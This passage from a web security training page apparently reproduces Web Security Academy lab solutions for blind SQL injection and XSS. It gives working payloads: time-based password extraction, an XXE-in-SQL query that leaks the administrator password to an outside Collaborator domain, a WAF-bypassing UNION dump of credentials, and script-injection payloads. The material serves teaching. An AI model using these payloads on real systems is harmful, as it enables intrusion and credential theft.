                                    requests in a single thread. To do this, go to the "Resource pool" tab and add the
                                    attack to a resource pool with the "Maximum concurrent requests" set to
                                    <code>
        1
       </code>
                                    .
                                </li>
                                <li>
                                    Launch the attack by clicking the "Start attack" button or selecting "Start attack"
                                    from the Intruder menu.
                                </li>
                                <li>
                                    Burp Intruder monitors the time taken for the application's response to be received,
                                    but by default it does not show this information. To see it, go to the "Columns"
                                    menu, and check the box for "Response received".
                                </li>
                                <li>
                                    Review the attack results to find the value of the character at the first position.
                                    You should see a column in the results called "Response received". This will
                                    generally contain a small number, representing the number of milliseconds the
                                    application took to respond. One of the rows should have a larger number in this
                                    column, in the region of 10,000 milliseconds. The payload showing for that row is
                                    the value of the character at the first position.
                                </li>
                                <li>
                                    <p>
                                        Now, you simply need to re-run the attack for each of the other character
                                        positions in the password, to determine their value. To do this, go back to the
                                        main Burp window, and the Positions tab of Burp Intruder, and change the
                                        specified offset from 1 to 2. You should then see the following as the cookie
                                        value:
                                    </p>
                                    <code class="code-scrollable">
        TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,2,1)='Â§aÂ§')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
       </code>
                                </li>
                                <li>
                                    Launch the modified attack, review the results, and note the character at the second
                                    offset.
                                </li>
                                <li>
                                    Continue this process testing offset 3, 4, and so on, until you have the whole
                                    password.
                                </li>
                                <li>
                                    In the browser, click "My account" to open the login page. Use the password to log
                                    in as the
                                    <code>
        administrator
       </code>
                                    user.
                                </li>
                            </ol>
                        </div>
                    </div>
                </details>
            </div>
        </div>
        <hr>
        <div class="section theme-white">
            <h1 class="heading-2">
                Lab: Blind
                <a href="https://portswigger.net/web-security/sql-injection">
                    SQL injection
                </a>
                with out-of-band interaction
                (sql-injection)
            </h1>
            <div class="container-columns">
                <p class="widget-container-labelevel">
                    <span class="label-light-blue-small">
                        PRACTITIONER
                    </span>
                </p>
            </div>
            <p>
                This lab contains a
                <a href="https://portswigger.net/web-security/sql-injection/blind">
                    blind SQL injection
                </a>
                vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing
                the value of the submitted cookie.
            </p>
            <p>
                The SQL query is executed asynchronously and has no effect on the application's response. However, you
                can trigger out-of-band interactions with an external domain.
            </p>
            <p>
                To solve the lab, exploit the SQL injection vulnerability to cause a DNS lookup to Burp Collaborator.
            </p>
            <div class="highlightedarea">
                <h4>
                    Note
                </h4>
                <p>
                    To prevent the Academy platform being used to attack third parties, our firewall blocks interactions
                    between the labs and arbitrary external systems. To solve the lab, you must use Burp Collaborator's
                    default public server.
                </p>
            </div>
            <div class="component-solution expandable-container">
                <details open>
                    <summary>
                        <h4>
                            <span class="icon-erlenmeyer">
                            </span>
                            Hint
                        </h4>
                    </summary>
                    <div class="content">
                        <div>
                            <p>
                                You can find some useful payloads on our
                                <a href="https://portswigger.net/web-security/sql-injection/cheat-sheet">
                                    SQL injection cheat sheet
                                </a>
                                .
                            </p>
                        </div>
                    </div>
                </details>
            </div>
            <div class="container-buttons-left">
                <a class="button-orange"
                    href="https://portswigger.net/academy/labs/launch/bd885d4dca761e440e1c4056234b100f514a5ba06cb79df59a7fdb02eda2af17?referrer=%2fweb-security%2fsql-injection%2fblind%2flab-out-of-band"
                    target="_blank">
                    <span class="icon-erlenmeyer">
                    </span>
                    ACCESS THE LAB
                </a>
            </div>
            <noscript>
                <p class="no-script-lab-warning">
                    Launching labs may take some time, please hold on while we build your environment.
                </p>
            </noscript>
            <div class="component-solution expandable-container">
                <details open>
                    <summary>
                        <h4>
                            <span class="icon-bulb">
                            </span>
                            Solution
                        </h4>
                    </summary>
                    <div class="content">
                        <div>
                            <ol>
                                <li>
                                    Visit the front page of the shop, and use Burp Suite to intercept and modify the
                                    request containing the
                                    <code>
        TrackingId
       </code>
                                    cookie.
                                </li>
                                <li>
                                    <p>
                                        Modify the
                                        <code>
         TrackingId
        </code>
                                        cookie, changing it to a payload that will trigger an interaction with the
                                        Collaborator server. For example, you can combine SQL injection with basic
                                        <a href="https://portswigger.net/web-security/xxe">
                                            XXE
                                        </a>
                                        techniques as follows:
                                    </p>
                                    <code class="code-scrollable">
        TrackingId=x'+UNION+SELECT+EXTRACTVALUE(xmltype('&lt;%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f&gt;&lt;!DOCTYPE+root+[+&lt;!ENTITY+%25+remote+SYSTEM+"http%3a//BURP-COLLABORATOR-SUBDOMAIN/"&gt;+%25remote%3b]&gt;'),'/l')+FROM+dual--
       </code>
                                </li>
                                <li>
                                    Right-click and select "Insert Collaborator payload" to insert a Burp Collaborator
                                    subdomain where indicated in the modified
                                    <code>
        TrackingId
       </code>
                                    cookie.
                                </li>
                            </ol>
                            <p>
                                The solution described here is sufficient simply to trigger a DNS lookup and so solve
                                the lab. In a real-world situation, you would use
                                <a href="https://portswigger.net/burp/documentation/desktop/tools/collaborator">
                                    Burp Collaborator
                                </a>
                                to verify that your payload had indeed triggered a DNS lookup and potentially exploit
                                this behavior to exfiltrate sensitive data from the application. We'll go over this
                                technique in the next lab.
                            </p>
                        </div>
                    </div>
                </details>
            </div>
        </div>
        <hr>
        <div class="section theme-white">
            <h1 class="heading-2">
                Lab: Blind
                <a href="https://portswigger.net/web-security/sql-injection">
                    SQL injection
                </a>
                with out-of-band data exfiltration
                (sql-injection)
            </h1>
            <div class="container-columns">
                <p class="widget-container-labelevel">
                    <span class="label-light-blue-small">
                        PRACTITIONER
                    </span>
                </p>
            </div>
            <p>
                This lab contains a
                <a href="https://portswigger.net/web-security/sql-injection/blind">
                    blind SQL injection
                </a>
                vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing
                the value of the submitted cookie.
            </p>
            <p>
                The SQL query is executed asynchronously and has no effect on the application's response. However, you
                can trigger out-of-band interactions with an external domain.
            </p>
            <p>
                The database contains a different table called
                <code>
   users
  </code>
                , with columns called
                <code>
   username
  </code>
                and
                <code>
   password
  </code>
                . You need to exploit the blind SQL injection vulnerability to find out the password of the
                <code>
   administrator
  </code>
                user.
            </p>
            <p>
                To solve the lab, log in as the
                <code>
   administrator
  </code>
                user.
            </p>
            <div class="highlightedarea">
                <h4>
                    Note
                </h4>
                <p>
                    To prevent the Academy platform being used to attack third parties, our firewall blocks interactions
                    between the labs and arbitrary external systems. To solve the lab, you must use Burp Collaborator's
                    default public server.
                </p>
            </div>
            <div class="component-solution expandable-container">
                <details open>
                    <summary>
                        <h4>
                            <span class="icon-erlenmeyer">
                            </span>
                            Hint
                        </h4>
                    </summary>
                    <div class="content">
                        <div>
                            <p>
                                You can find some useful payloads on our
                                <a href="https://portswigger.net/web-security/sql-injection/cheat-sheet">
                                    SQL injection cheat sheet
                                </a>
                                .
                            </p>
                        </div>
                    </div>
                </details>
            </div>
            <div class="container-buttons-left">
                <a class="button-orange"
                    href="https://portswigger.net/academy/labs/launch/365ed5e4a7dbea87f7a659dd1349317f193bd4449f6ab6ed8062e5a319f553c6?referrer=%2fweb-security%2fsql-injection%2fblind%2flab-out-of-band-data-exfiltration"
                    target="_blank">
                    <span class="icon-erlenmeyer">
                    </span>
                    ACCESS THE LAB
                </a>
            </div>
            <noscript>
                <p class="no-script-lab-warning">
                    Launching labs may take some time, please hold on while we build your environment.
                </p>
            </noscript>
            <div class="component-solution expandable-container">
                <details open>
                    <summary>
                        <h4>
                            <span class="icon-bulb">
                            </span>
                            Solution
                        </h4>
                    </summary>
                    <div class="content">
                        <div>
                            <ol>
                                <li>
                                    Visit the front page of the shop, and use
                                    <a href="https://portswigger.net/burp/pro">
                                        Burp Suite Professional
                                    </a>
                                    to intercept and modify the request containing the
                                    <code>
        TrackingId
       </code>
                                    cookie.
                                </li>
                                <li>
                                    <p>
                                        Modify the
                                        <code>
         TrackingId
        </code>
                                        cookie, changing it to a payload that will leak the administrator's password in
                                        an interaction with the Collaborator server. For example, you can combine SQL
                                        injection with basic
                                        <a href="https://portswigger.net/web-security/xxe">
                                            XXE
                                        </a>
                                        techniques as follows:
                                    </p>
                                    <code class="code-scrollable">
        TrackingId=x'+UNION+SELECT+EXTRACTVALUE(xmltype('&lt;%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f&gt;&lt;!DOCTYPE+root+[+&lt;!ENTITY+%25+remote+SYSTEM+"http%3a//'||(SELECT+password+FROM+users+WHERE+username%3d'administrator')||'.BURP-COLLABORATOR-SUBDOMAIN/"&gt;+%25remote%3b]&gt;'),'/l')+FROM+dual--
       </code>
                                </li>
                                <li>
                                    Right-click and select "Insert Collaborator payload" to insert a Burp Collaborator
                                    subdomain where indicated in the modified
                                    <code>
        TrackingId
       </code>
                                    cookie.
                                </li>
                                <li>
                                    Go to the Collaborator tab, and click "Poll now". If you don't see any interactions
                                    listed, wait a few seconds and try again, since the server-side query is executed
                                    asynchronously.
                                </li>
                                <li>
                                    You should see some DNS and HTTP interactions that were initiated by the application
                                    as the result of your payload. The password of the
                                    <code>
        administrator
       </code>
                                    user should appear in the subdomain of the interaction, and you can view this within
                                    the Collaborator tab. For DNS interactions, the full domain name that was looked up
                                    is shown in the Description tab. For HTTP interactions, the full domain name is
                                    shown in the Host header in the Request to Collaborator tab.
                                </li>
                                <li>
                                    In the browser, click "My account" to open the login page. Use the password to log
                                    in as the
                                    <code>
        administrator
       </code>
                                    user.
                                </li>
                            </ol>
                        </div>
                    </div>
                </details>
            </div>
        </div>
        <hr>
        <div class="section theme-white">
            <h1 class="heading-2">
                Lab: SQL injection with filter bypass via XML encoding
                (sql-injection)</h1>
            <div class="container-columns">
                <p class="widget-container-labelevel">
                    <span class="label-light-blue-small">
                        PRACTITIONER
                    </span>
                </p>
            </div>
            <p>
                This lab contains a
                <a href="https://portswigger.net/web-security/sql-injection">
                    SQL injection
                </a>
                vulnerability in its stock check feature. The results from the query are returned in the application's
                response, so you can use a UNION attack to retrieve data from other tables.
            </p>
            <p>
                The database contains a
                <code>
   users
  </code>
                table, which contains the usernames and passwords of registered users. To solve the lab, perform a SQL
                injection attack to retrieve the admin user's credentials, then log in to their account.
            </p>
            <div class="component-solution expandable-container">
                <details open>
                    <summary>
                        <h4>
                            <span class="icon-erlenmeyer">
                            </span>
                            Hint
                        </h4>
                    </summary>
                    <div class="content">
                        <div>
                            <p>
                                A web application firewall (WAF) will block requests that contain obvious signs of a SQL
                                injection attack. You'll need to find a way to obfuscate your malicious query to bypass
                                this filter. We recommend using the
                                <a href="https://portswigger.net/bappstore/65033cbd2c344fbabe57ac060b5dd100">
                                    Hackvertor
                                </a>
                                extension to do this.
                            </p>
                        </div>
                    </div>
                </details>
            </div>
            <div class="container-buttons-left">
                <a class="button-orange"
                    href="https://portswigger.net/academy/labs/launch/c8332afeeb7acf103db621a4d16b7249c26f7040478a07ff274d2f98687b02b6?referrer=%2fweb-security%2fsql-injection%2flab-sql-injection-with-filter-bypass-via-xml-encoding"
                    target="_blank">
                    <span class="icon-erlenmeyer">
                    </span>
                    ACCESS THE LAB
                </a>
            </div>
            <noscript>
                <p class="no-script-lab-warning">
                    Launching labs may take some time, please hold on while we build your environment.
                </p>
            </noscript>
            <div class="component-solution expandable-container">
                <details open>
                    <summary>
                        <h4>
                            <span class="icon-bulb">
                            </span>
                            Solution
                        </h4>
                    </summary>
                    <div class="content">
                        <div>
                            <p>
                                <strong>
                                    Identify the vulnerability
                                </strong>
                            </p>
                            <ol>
                                <li>
                                    <p>
                                        Observe that the stock check feature sends the
                                        <code>
         productId
        </code>
                                        and
                                        <code>
         storeId
        </code>
                                        to the application in XML format.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        Send the
                                        <code>
         POST /product/stock
        </code>
                                        request to Burp Repeater.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        In Burp Repeater, probe the
                                        <code>
         storeId
        </code>
                                        to see whether your input is evaluated. For example, try replacing the ID with
                                        mathematical expressions that evaluate to other potential IDs, for example:
                                    </p>
                                    <code class="code-scrollable">
        &lt;storeId&gt;1+1&lt;/storeId&gt;
       </code>
                                </li>
                                <li>
                                    <p>
                                        Observe that your input appears to be evaluated by the application, returning
                                        the stock for different stores.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        Try determining the number of columns returned by the original query by
                                        appending a
                                        <code>
         UNION SELECT
        </code>
                                        statement to the original store ID:
                                    </p>
                                    <code class="code-scrollable">
        &lt;storeId&gt;1 UNION SELECT NULL&lt;/storeId&gt;
       </code>
                                </li>
                                <li>
                                    <p>
                                        Observe that your request has been blocked due to being flagged as a potential
                                        attack.
                                    </p>
                                </li>
                            </ol>
                            <p>
                                <strong>
                                    Bypass the WAF
                                </strong>
                            </p>
                            <ol>
                                <li>
                                    <p>
                                        As you're injecting into XML, try obfuscating your payload using
                                        <a href="https://portswigger.net/web-security/xxe/xml-entities">
                                            XML entities
                                        </a>
                                        . One way to do this is using the
                                        <a href="https://portswigger.net/bappstore/65033cbd2c344fbabe57ac060b5dd100">
                                            Hackvertor
                                        </a>
                                        extension. Just highlight your input, right-click, then select
                                        <strong>
                                            Extensions &gt; Hackvertor &gt; Encode &gt; dec_entities/hex_entities
                                        </strong>
                                        .
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        Resend the request and notice that you now receive a normal response from the
                                        application. This suggests that you have successfully bypassed the WAF.
                                    </p>
                                </li>
                            </ol>
                            <p>
                                <strong>
                                    Craft an exploit
                                </strong>
                            </p>
                            <ol>
                                <li>
                                    <p>
                                        Pick up where you left off, and deduce that the query returns a single column.
                                        When you try to return more than one column, the application returns
                                        <code>
         0 units
        </code>
                                        , implying an error.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        As you can only return one column, you need to concatenate the returned
                                        usernames and passwords, for example:
                                    </p>
                                    <code class="code-scrollable">
        &lt;storeId&gt;&lt;@hex_entities&gt;1 UNION SELECT username || '~' || password FROM users&lt;@/hex_entities&gt;&lt;/storeId&gt;
       </code>
                                </li>
                                <li>
                                    <p>
                                        Send this query and observe that you've successfully fetched the usernames and
                                        passwords from the database, separated by a
                                        <code>
         ~
        </code>
                                        character.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        Use the administrator's credentials to log in and solve the lab.
                                    </p>
                                </li>
                            </ol>
                        </div>
                    </div>
                </details>
            </div>
        </div>
        <hr>
        <div class="section theme-white">
            <h1 class="heading-2">
                Lab:
                <a href="https://portswigger.net/web-security/cross-site-scripting/reflected">
                    Reflected XSS
                </a>
                into HTML context with nothing encoded
                (cross-site-scripting)
            </h1>
            <div class="container-columns">
                <p class="widget-container-labelevel">
                    <span class="label-light-green-small">
                        APPRENTICE
                    </span>
                </p>
            </div>
            <p>
                This lab contains a simple
                <a href="https://portswigger.net/web-security/cross-site-scripting/reflected">
                    reflected cross-site scripting
                </a>
                vulnerability in the search functionality.
            </p>
            <p>
                To solve the lab, perform a cross-site scripting attack that calls the
                <code>
   alert
  </code>
                function.
            </p>
            <div class="container-buttons-left">
                <a class="button-orange"
                    href="https://portswigger.net/academy/labs/launch/9e3414ee887ebaed9f7ed25b58dd639959bb28a3b926f53c831c1d86e03d8813?referrer=%2fweb-security%2fcross-site-scripting%2freflected%2flab-html-context-nothing-encoded"
                    target="_blank">
                    <span class="icon-erlenmeyer">
                    </span>
                    ACCESS THE LAB
                </a>
            </div>
            <noscript>
                <p class="no-script-lab-warning">
                    Launching labs may take some time, please hold on while we build your environment.
                </p>
            </noscript>
            <div class="component-solution expandable-container">
                <details open>
                    <summary>
                        <h4>
                            <span class="icon-bulb">
                            </span>
                            Solution
                        </h4>
                    </summary>
                    <div class="content">
                        <div>
                            <ol>
                                <li>
                                    <p>
                                        Copy and paste the following into the search box:
                                    </p>
                                    <code class="code-scrollable">
        &lt;script&gt;alert(1)&lt;/script&gt;
       </code>
                                </li>
                                <li>
                                    Click "Search".
                                </li>
                            </ol>
                        </div>
                    </div>
                </details>
            </div>
        </div>
        <hr>
        <div class="section theme-white">
            <h1 class="heading-2">
                Lab:
                <a href="https://portswigger.net/web-security/cross-site-scripting/stored">
                    Stored XSS
                </a>
                into HTML context with nothing encoded
                (cross-site-scripting)
            </h1>
            <div class="container-columns">
                <p class="widget-container-labelevel">
                    <span class="label-light-green-small">
                        APPRENTICE
                    </span>
                </p>
            </div>
            <p>
                This lab contains a
                <a href="https://portswigger.net/web-security/cross-site-scripting/stored">
                    stored cross-site scripting
                </a>
                vulnerability in the comment functionality.
            </p>
            <p>
                To solve this lab, submit a comment that calls the
                <code>
   alert
  </code>
                function when the blog post is viewed.
            </p>
            <div class="container-buttons-left">
                <a class="button-orange"
                    href="https://portswigger.net/academy/labs/launch/09e0bee59e32e92a78e614589793110f95c397459ed0ab96a3dbaf100e3b7cde?referrer=%2fweb-security%2fcross-site-scripting%2fstored%2flab-html-context-nothing-encoded"
                    target="_blank">
                    <span class="icon-erlenmeyer">
                    </span>
                    ACCESS THE LAB
                </a>
            </div>
            <noscript>
                <p class="no-script-lab-warning">
                    Launching labs may take some time, please hold on while we build your environment.
                </p>
            </noscript>
            <div class="component-solution expandable-container">
                <details open>
                    <summary>
                        <h4>
                            <span class="icon-bulb">
                            </span>
                            Solution
                        </h4>
                    </summary>
                    <div class="content">
                        <div>
                            <ol>
                                <li>
                                    <p>
                                        Enter the following into the comment box:
                                    </p>
                                    <code class="code-scrollable">
        &lt;script&gt;alert(1)&lt;/script&gt;
       </code>
                                </li>
                                <li>
                                    Enter a name, email and website.
                                </li>
                                <li>
                                    Click "Post comment".
                                </li>
                                <li>
                                    Go back to the blog.
                                </li>
                            </ol>
                        </div>
                    </div>
                </details>
            </div>
        </div>
        <hr>
        <div class="section theme-white">
            <h1 class="heading-2">
                Lab:
                <a href="https://portswigger.net/web-security/cross-site-scripting/dom-based">
                    DOM XSS
                </a>
                in
                <code>
   document.write
  </code>
                sink using source
                <code>
   location.search
  </code>
                (cross-site-scripting)
            </h1>
            <div class="container-columns">
                <p class="widget-container-labelevel">
                    <span class="label-light-green-small">
                        APPRENTICE
                    </span>
                </p>
            </div>
            <p>
                This lab contains a
                <a href="https://portswigger.net/web-security/cross-site-scripting/dom-based">
                    DOM-based cross-site scripting
                </a>
                vulnerability in the search query tracking functionality. It uses the JavaScript
                <code>
   document.write
  </code>
                function, which writes data out to the page. The
                <code>
   document.write
  </code>
                function is called with data from
                <code>
   location.search
  </code>
                , which you can control using the website URL.
            </p>
            <p>
                To solve this lab, perform a
                <a href="https://portswigger.net/web-security/cross-site-scripting">
                    cross-site scripting
                </a>
                attack that calls the
                <code>
   alert
  </code>
                function.
            </p>
            <div class="container-buttons-left">
                <a class="button-orange"
                    href="https://portswigger.net/academy/labs/launch/6127df9244c9acedc241085d647719a0d9975c5af692444a9c913566fd2fd88b?referrer=%2fweb-security%2fcross-site-scripting%2fdom-based%2flab-document-write-sink"
                    target="_blank">
                    <span class="icon-erlenmeyer">
                    </span>
                    ACCESS THE LAB
                </a>
            </div>
            <noscript>
                <p class="no-script-lab-warning">
                    Launching labs may take some time, please hold on while we build your environment.
                </p>
            </noscript>
            <div class="component-solution expandable-container">
                <details open>
                    <summary>
                        <h4>
                            <span class="icon-bulb">
                            </span>
                            Solution
                        </h4>
                    </summary>
                    <div class="content">
                        <div>
                            <ol>
                                <li>
                                    Enter a random alphanumeric string into the search box.
                                </li>
                                <li>
                                    Right-click and inspect the element, and observe that your random string has been
                                    placed inside an
                                    <code>
        img src
       </code>
                                    attribute.
                                </li>
                                <li>
                                    <p>
                                        Break out of the
                                        <code>
         img
        </code>
                                        attribute by searching for:
                                    </p>
                                    <code class="code-scrollable">
        "&gt;&lt;svg onload=alert(1)&gt;
       </code>
                                </li>
                            </ol>
                        </div>
                    </div>
                </details>
            </div>
        </div>
        <hr>
        <div class="section theme-white">
            <h1 class="heading-2">
                Lab:
                <a href="https://portswigger.net/web-security/cross-site-scripting/dom-based">
                    DOM XSS
                </a>
                in
                <code>
   innerHTML
  </code>
                sink using source
                <code>
   location.search
  </code>
                (cross-site-scripting)
            </h1>
            <div class="container-columns">
                <p class="widget-container-labelevel">
                    <span class="label-light-green-small">
                        APPRENTICE
                    </span>
                </p>
            </div>
            <p>
                This lab contains a
                <a href="https://portswigger.net/web-security/cross-site-scripting/dom-based">
                    DOM-based cross-site scripting
                </a>
                vulnerability in the search blog functionality. It uses an
                <code>
   innerHTML
  </code>
                assignment, which changes the HTML contents of a
                <code>
   div
  </code>
                element, using data from
                <code>
   location.search
  </code>
                .
            </p>
            <p>
                To solve this lab, perform a
                <a href="https://portswigger.net/web-security/cross-site-scripting">
                    cross-site scripting
                </a>
                attack that calls the
                <code>
   alert
  </code>
                function.
            </p>
            <div class="container-buttons-left">
                <a class="button-orange"
                    href="https://portswigger.net/academy/labs/launch/643e053e185d7855c6c7ea780bb082fa545fdd40e72aabc79f1742eb2ad07914?referrer=%2fweb-security%2fcross-site-scripting%2fdom-based%2flab-innerhtml-sink"
                    target="_blank">
                    <span class="icon-erlenmeyer">
                    </span>
                    ACCESS THE LAB
                </a>
            </div>
            <noscript>
                <p class="no-script-lab-warning">
                    Launching labs may take some time, please hold on while we build your environment.
                </p>
            </noscript>
            <div class="component-solution expandable-container">
                <details open>
                    <summary>
                        <h4>
                            <span class="icon-bulb">
                            </span>
                            Solution
                        </h4>
                    </summary>
                    <div class="content">
                        <div>
                            <ol>
                                <li>
                                    <p>
                                        Enter the following into the into the search box:
                                    </p>
                                    <code class="code-scrollable">
        &lt;img src=1 onerror=alert(1)&gt;
       </code>
                                </li>
                                <li>
                                    Click "Search".
                                </li>
                            </ol>
                            <p>
                                The value of the
                                <code>
       src
      </code>
                                attribute is invalid and throws an error. This triggers the
                                <code>
       onerror
      </code>
                                event handler, which then calls the
                                <code>
       alert()
      </code>
                                function. As a result, the payload is executed whenever the user's browser attempts to
                                load the page containing your malicious post.
                            </p>
                        </div>
                    </div>
                </details>
            </div>
        </div>
        <hr>
        <div class="section theme-white">
            <h1 class="heading-2">
                Lab:
                <a href="https://portswigger.net/web-security/cross-site-scripting/dom-based">
                    DOM XSS
                </a>
                in jQuery anchor
                <code>
   href
  </code>
                attribute sink using
                <code>
   location.search
  </code>
                source
                (cross-site-scripting)
            </h1>
            <div class="container-columns">
                <p class="widget-container-labelevel">
                    <span class="label-light-green-small">
                        APPRENTICE
                    </span>
                </p>
            </div>
            <p>
                This lab contains a
                <a href="https://portswigger.net/web-security/cross-site-scripting/dom-based">
                    DOM-based cross-site scripting
                </a>
                vulnerability in the submit feedback page. It uses the jQuery library's
                <code>
   $
  </code>
                selector function to find an anchor element, and changes its
                <code>
   href
  </code>
                attribute using data from
                <code>
   location.search
  </code>
                .
            </p>
            <p>
                To solve this lab, make the "back" link alert
                <code>
   document.cookie
  </code>
                .
            </p>
            <div class="container-buttons-left">
                <a class="button-orange"
                    href="https://portswigger.net/academy/labs/launch/fde8784b9c158cac28b9d1a29d6331d2a28cf38742e1c59454be9a1fe37cff54?referrer=%2fweb-security%2fcross-site-scripting%2fdom-based%2flab-jquery-href-attribute-sink"
                    target="_blank">
                    <span class="icon-erlenmeyer">
                    </span>
                    ACCESS THE LAB
                </a>
            </div>
            <noscript>
                <p class="no-script-lab-warning">
                    Launching labs may take some time, please hold on while we build your environment.
                </p>
            </noscript>
            <div class="component-solution expandable-container">
                <details open>
                    <summary>
                        <h4>
                            <span class="icon-bulb">
                            </span>
                            Solution
                        </h4>
                    </summary>
                    <div class="content">
                        <div>
                            <ol>
                                <li>
                                    On the Submit feedback page, change the query parameter
                                    <code>
        returnPath
       </code>
                                    to
                                    <code>
        /
       </code>
                                    followed by a random alphanumeric string.
                                </li>
                                <li>
                                    Right-click and inspect the element, and observe that your random string has been
                                    placed inside an a
                                    <code>
        href
       </code>
                                    attribute.
                                </li>
                                <li>
                                    <p>
                                        Change
                                        <code>
         returnPath
        </code>
                                        to:
                                    </p>
                                    <code class="code-scrollable">
        javascript:alert(document.cookie)
       </code>
                                    <p>
                                        Hit enter and click "back".
                                    </p>
                                </li>
                            </ol>
                        </div>
                    </div>
                </details>
            </div>
        </div>
        <hr>
        <div class="section theme-white">
            <h1 class="heading-2">
                Lab:
                <a href="https://portswigger.net/web-security/cross-site-scripting/dom-based">
                    DOM XSS
                </a>
                in jQuery selector sink using a hashchange event
                (cross-site-scripting)
            </h1>
            <div class="container-columns">
                <p class="widget-container-labelevel">
                    <span class="label-light-green-small">
                        APPRENTICE
                    </span>
                </p>
            </div>
            <p>
                This lab contains a
                <a href="https://portswigger.net/web-security/cross-site-scripting/dom-based">
                    DOM-based cross-site scripting
                </a>
                vulnerability on the home page. It uses jQuery's
                <code>
   $()
  </code>
                selector function to auto-scroll to a given post, whose title is passed via the
                <code>
   location.hash
  </code>
                property.
            </p>
            <p>
                To solve the lab, deliver an exploit to the victim that calls the
                <code>
   print()
  </code>
                function in their browser.
            </p>
            <div class="container-buttons-left">
                <a class="button-orange"
                    href="https://portswigger.net/academy/labs/launch/b73aad4efa87dfe5458720e5a4713f2b416825e550dc9d161f58635db7a48dcd?referrer=%2fweb-security%2fcross-site-scripting%2fdom-based%2flab-jquery-selector-hash-change-event"
                    target="_blank">
                    <span class="icon-erlenmeyer">
                    </span>
                    ACCESS THE LAB
                </a>
            </div>
            <noscript>
                <p class="no-script-lab-warning">
                    Launching labs may take some time, please hold on while we build your environment.
                </p>
            </noscript>
            <div class="component-solution expandable-container">
                <details open>
                    <summary>
                        <h4>
                            <span class="icon-bulb">
                            </span>
                            Solution
                        </h4>
                    </summary>
                    <div class="content">
                        <div>
                            <ol>
                                <li>
                                    Notice the vulnerable code on the home page using Burp or the browser's DevTools.
                                </li>
                                <li>
                                    From the lab banner, open the exploit server.
                                </li>
                                <li>
                                    <p>
                                        In the
                                        <strong>
                                            Body
                                        </strong>
                                        section, add the following malicious
                                        <code>
         iframe
        </code>
                                        :
                                    </p>
                                    <code class="code-scrollable">
        &lt;iframe src="https://YOUR-LAB-ID.web-security-academy.net/#" onload="this.src+='&lt;img src=x onerror=print()&gt;'"&gt;&lt;/iframe&gt;
       </code>
                                </li>
                                <li>
                                    Store the exploit, then click
                                    <strong>
                                        View exploit
                                    </strong>
                                    to confirm that the
                                    <code>
        print()
       </code>
                                    function is called.
                                </li>
                                <li>
                                    Go back to the exploit server and click
                                    <strong>
                                        Deliver to victim
                                    </strong>
                                    to solve the lab.
                                </li>
                            </ol>
                        </div>
                    </div>
                </details>
            </div>
        </div>
        <hr>
        <div class="section theme-white">
            <h1 class="heading-2">
                Lab:
                <a href="https://portswigger.net/web-security/cross-site-scripting/reflected">
                    Reflected XSS
                </a>
                into attribute with angle brackets HTML-encoded
                (cross-site-scripting)
            </h1>
            <div class="container-columns">
                <p class="widget-container-labelevel">
                    <span class="label-light-green-small">
                        APPRENTICE
                    </span>
                </p>
            </div>
            <p>
                This lab contains a
                <a href="https://portswigger.net/web-security/cross-site-scripting/reflected">
                    reflected cross-site scripting
                </a>
                vulnerability in the search blog functionality where angle brackets are HTML-encoded. To solve this lab,
                perform a cross-site scripting attack that injects an attribute and calls the
                <code>
   alert
  </code>
                function.
            </p>
            <div class="component-solution expandable-container">
                <details open>
                    <summary>
                        <h4>
                            <span class="icon-erlenmeyer">
                            </span>
                            Hint
                        </h4>
                    </summary>
                    <div class="content">
                        <div>
                            <p>
                                Just because you're able to trigger the
                                <code>
       alert()
      </code>
                                yourself doesn't mean that this will work on the victim. You may need to try injecting
                                your proof-of-concept payload with a variety of different attributes before you find one
                                that successfully executes in the victim's browser.
                            </p>
                        </div>
                    </div>
                </details>
            </div>
            <div class="container-buttons-left">
                <a class="button-orange"
                    href="https://portswigger.net/academy/labs/launch/8db2d4d5d579849ca64098e4415c35888c0af17e8f9b0849462456d7b14b8087?referrer=%2fweb-security%2fcross-site-scripting%2fcontexts%2flab-attribute-angle-brackets-html-encoded"
                    target="_blank">
                    <span class="icon-erlenmeyer">
                    </span>
                    ACCESS THE LAB
                </a>
            </div>
            <noscript>
                <p class="no-script-lab-warning">
                    Launching labs may take some time, please hold on while we build your environment.
                </p>
            </noscript>
            <div class="component-solution expandable-container">
                <details open>
                    <summary>
                        <h4>
                            <span class="icon-bulb">
                            </span>
                            Solution
                        </h4>
                    </summary>
                    <div class="content">
                        <div>
                            <ol>
                                <li>
                                    Submit a random alphanumeric string in the search box, then use Burp Suite to
                                    intercept the search request and send it to Burp Repeater.
                                </li>
                                <li>
                                    Observe that the random string has been reflected inside a quoted attribute.
                                </li>
                                <li>
                                    <p>
                                        Replace your input with the following payload to escape the quoted attribute and
                                        inject an event handler:
                                    </p>
                                    <code class="code-scrollable">
        "onmouseover="alert(1)
       </code>
                                </li>
                                <li>
                                    Verify the technique worked by right-clicking, selecting "Copy URL", and pasting the
                                    URL in the browser. When you move the mouse over the injected element it should
                                    trigger an alert.
                                </li>
                            </ol>
                        </div>
                    </div>
                </details>
            </div>
        </div>
        <hr>
        <div class="section theme-white">
            <h1 class="heading-2">
                Lab:
                <a href="https://portswigger.net/web-security/cross-site-scripting/stored">
                    Stored XSS
                </a>
                into anchor
                <code>
   href
  </code>
                attribute with double quotes HTML-encoded
                (cross-site-scripting)
            </h1>
            <div class="container-columns">
                <p class="widget-container-labelevel">
                    <span class="label-light-green-small">
                        APPRENTICE
                    </span>
                </p>
            </div>
            <p>
                This lab contains a
                <a href="https://portswigger.net/web-security/cross-site-scripting/stored">
                    stored cross-site scripting
                </a>
                vulnerability in the comment functionality. To solve this lab, submit a comment that calls the
                <code>
   alert
  </code>
                function when the comment author name is clicked.
            </p>
            <div class="container-buttons-left">
                <a class="button-orange"
                    href="https://portswigger.net/academy/labs/launch/837b80f7b6cb679ddb307a046af6df7c851399e3337726434ac2681cba79f639?referrer=%2fweb-security%2fcross-site-scripting%2fcontexts%2flab-href-attribute-double-quotes-html-encoded"
